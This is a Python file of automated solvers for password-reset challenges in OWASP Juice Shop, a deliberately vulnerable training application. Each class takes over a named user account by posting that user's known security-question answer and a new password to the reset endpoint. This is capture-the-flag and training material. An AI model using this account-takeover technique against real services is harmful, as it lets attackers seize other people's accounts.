from core.base_solver import BaseSolver
from loguru import logger

class ResetPasswordBjoernChallenge(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "resetPasswordBjoernChallenge"

    def solve(self) -> bool:
        # Bjoern's internal account security answer (historical twist): West-2082
        payload = {
            "email": "bjoern@juice-sh.op",
            "answer": "West-2082",
            "new": "new_password123",
            "repeat": "new_password123"
        }
        res = self.client.post("/rest/user/reset-password", json=payload)
        return res.status_code == 200

class ResetPasswordBjoernOwaspChallenge(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "resetPasswordBjoernOwaspChallenge"

    def solve(self) -> bool:
        # Bjoern's OWASP security answer (Favorite pet): Zaya
        payload = {
            "email": "bjoern@owasp.org",
            "answer": "Zaya",
            "new": "new_password123",
            "repeat": "new_password123"
        }
        res = self.client.post("/rest/user/reset-password", json=payload)
        return res.status_code == 200

class ResetPasswordJimChallenge(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "resetPasswordJimChallenge"

    def solve(self) -> bool:
        # Jim's security answer (Eldest sibling middle name): Samuel
        payload = {
            "email": "jim@juice-sh.op",
            "answer": "Samuel",
            "new": "new_password123",
            "repeat": "new_password123"
        }
        res = self.client.post("/rest/user/reset-password", json=payload)
        return res.status_code == 200

class ResetPasswordMortyChallenge(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "resetPasswordMortyChallenge"

    def solve(self) -> bool:
        # Morty's security answer (Favorite pet): 5N0wb41L
        payload = {
            "email": "morty@juice-sh.op",
            "answer": "5N0wb41L",
            "new": "new_password123",
            "repeat": "new_password123"
        }
        res = self.client.post("/rest/user/reset-password", json=payload)
        return res.status_code == 200

class ResetPasswordBenderChallenge(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "resetPasswordBenderChallenge"

    def solve(self) -> bool:
        # Bender's security answer (Favorite fictional character): Stop'n'Drop
        payload = {
            "email": "bender@juice-sh.op",
            "answer": "Stop'n'Drop",
            "new": "new_password123",
            "repeat": "new_password123"
        }
        res = self.client.post("/rest/user/reset-password", json=payload)
        return res.status_code == 200

class ResetPasswordUvoginChallenge(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "resetPasswordUvoginChallenge"

    def solve(self) -> bool:
        # Uvogin's security answer (Favorite movie): Silence of the Lambs
        payload = {
            "email": "uvogin@juice-sh.op",
            "answer": "Silence of the Lambs",
            "new": "new_password123",
            "repeat": "new_password123"
        }
        res = self.client.post("/rest/user/reset-password", json=payload)
        return res.status_code == 200

class ResetPasswordJohnChallenge(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "geoStalkingMetaChallenge"
    def solve(self) -> bool:
        payload = {
            "email": "john@juice-sh.op",
            "answer": "Daniel Boone National Forest",
            "new": "new_password123",
            "repeat": "new_password123"
        }
        res = self.client.post("/rest/user/reset-password", json=payload)
        return res.status_code == 200

class ResetPasswordEmmaChallenge(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "geoStalkingVisualChallenge"
    def solve(self) -> bool:
        payload = {
            "email": "emma@juice-sh.op",
            "answer": "ITsec",
            "new": "new_password123",
            "repeat": "new_password123"
        }
        res = self.client.post("/rest/user/reset-password", json=payload)
        return res.status_code == 200
